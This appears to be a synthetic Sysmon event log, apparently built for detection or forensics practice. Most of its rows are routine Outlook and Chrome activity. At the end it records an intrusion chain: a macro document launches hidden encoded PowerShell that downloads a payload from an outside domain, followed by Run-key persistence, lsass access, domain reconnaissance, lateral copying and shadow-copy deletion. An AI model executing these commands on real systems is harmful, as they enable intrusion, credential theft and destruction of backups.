UtcTime,EventID,Image,ParentImage,User,CommandLine,TargetImage,DestinationIp,QueryName
2026-05-11 09:32:34.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:32:40.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:33:03.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:33:17.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:33:42.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:34:10.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:34:37.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:35:04.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:35:27.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:35:42.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:36:14.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:36:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:37:03.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:37:18.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:37:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:37:29.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:38:01.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:38:27.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:38:35.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:39:06.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:39:46.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:40:12.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:40:35.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:40:38.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:41:15.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:41:23.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:41:59.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:42:28.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:42:40.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:42:55.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:42:58.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:43:09.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:43:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:44:12.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:44:24.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:44:43.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:45:03.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:45:38.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:45:49.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:46:00.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:46:26.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:46:29.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:46:57.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:47:34.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:47:39.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:47:53.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:48:23.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:48:30.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:48:47.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:49:03.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:49:07.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:49:27.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:49:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:49:49.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:50:21.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:50:36.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:50:50.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:51:01.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:51:37.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:51:44.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:52:11.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:52:24.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:52:41.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:52:57.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:53:15.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:53:37.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:54:11.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:54:20.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:54:40.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:55:18.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:55:25.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:55:53.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:56:26.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:56:48.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:57:06.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:14:00.000,1,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"WINWORD.EXE /n "C:\Users\j.park\Downloads\3월_정산내역_확인요망.docm"",,,
2026-05-11 09:14:08.000,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,FINANCE\\j.park,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",,,
2026-05-11 09:14:11.000,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,FINANCE\\j.park,"",,,cdn-telemetry-sync.net
2026-05-11 09:14:12.000,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,FINANCE\\j.park,"",,203.0.113.187,
2026-05-11 09:14:34.000,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,FINANCE\\j.park,"",C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,,
2026-05-11 09:14:40.000,13,C:\Windows\System32\reg.exe,C:\Windows\System32\cmd.exe,FINANCE\\j.park,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /d "C:\Users\j.park\AppData\Roaming\OneDriveSync.exe"",HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync,,
2026-05-11 09:18:40.000,10,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,,FINANCE\\j.park,"",C:\Windows\system32\lsass.exe,,
2026-05-11 09:19:01.000,1,C:\Windows\System32\cmd.exe,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,FINANCE\\j.park,"whoami /priv",,,
2026-05-11 09:19:54.000,1,C:\Windows\System32\cmd.exe,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,FINANCE\\j.park,"net group "Domain Admins" /domain",,,
2026-05-11 09:20:27.000,1,C:\Windows\System32\cmd.exe,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,FINANCE\\j.park,"nltest /dclist:finance.local",,,
2026-05-11 09:29:27.000,1,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"WmiPrvSE.exe -Embedding",,,
2026-05-11 09:29:29.000,1,C:\Windows\System32\cmd.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,FINANCE\\j.park,"cmd.exe /c copy \\SRV-FIN02\C$\temp\OneDriveSync.exe",,,
2026-05-11 09:47:29.000,1,C:\Windows\System32\vssadmin.exe,C:\Windows\System32\cmd.exe,FINANCE\\j.park,"vssadmin.exe delete shadows /all /quiet",,,
